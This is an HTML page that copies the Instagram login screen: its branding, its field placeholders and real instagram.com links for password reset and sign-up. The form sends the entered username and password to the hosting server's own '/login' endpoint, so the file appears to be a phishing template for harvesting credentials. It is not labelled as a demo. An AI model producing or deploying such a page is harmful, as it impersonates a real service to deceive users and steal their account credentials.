<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram</title>
  <style>
    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: normal;
      src: url('https://fonts.gstatic.com/s/roboto/v48/KFOMCnqEu92Fr1ME7kSn66aGLdTylUAMQXC89YmC2DPNWubEbWmT.ttf') format('truetype');
    }
    @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');

    body {
      font-family: 'Roboto', sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 36px;
      width: 350px;
      text-align: center;
      border-radius: 6px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }

    .instagram-logo {
      font-family: 'Billabong', cursive;
      font-size: 60px;
      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 24px;
      user-select: none;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      margin: 6px 0 16px;
      padding: 10px 12px;
      font-size: 14px;
      box-sizing: border-box;
      outline: none;
      transition: border-color 0.3s ease;
    }
    input[type="text"]:focus, input[type="password"]:focus {
      border-color: #a78eff;
      background: white;
    }

    button {
      width: 100%;
      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      color: white;
      border: none;
      padding: 10px 0;
      font-weight: 700;
      border-radius: 6px;
      cursor: pointer;
      font-size: 15px;
      margin: 14px 0 8px;
      box-shadow: 0 5px 10px rgba(188, 24, 136, 0.6);
      transition: background 0.3s ease;
    }
    button:hover {
      background: linear-gradient(45deg, #bc1888, #cc2366, #dc2743, #e6683c, #f09433);
      box-shadow: 0 7px 14px rgba(204, 35, 102, 0.8);
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0 24px;
      color: #999;
      font-weight: 600;
      font-size: 13px;
    }
    .divider::before, .divider::after {
      content: '';
      flex-grow: 1;
      background-color: #dbdbdb;
      height: 1px;
      font-size: 0;
      line-height: 0;
      margin: 0 18px;
    }

    .footer-text {
      font-size: 14px;
      color: #8e8e8e;
      margin-top: 28px;
      user-select: none;
    }

    a {
      color: #00376b;
      text-decoration: none;
      font-weight: 600;
      transition: color 0.3s;
    }

    a:hover {
      color: #7a3ee0;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="instagram-logo">Instagram</div>
    <form id="loginForm" autocomplete="off" method="POST" action="/login">
      <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" id="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <div class="divider">OR</div>

    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>

    <div class="footer-text">
      Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
    </div>
  </div>
</body>
</html>
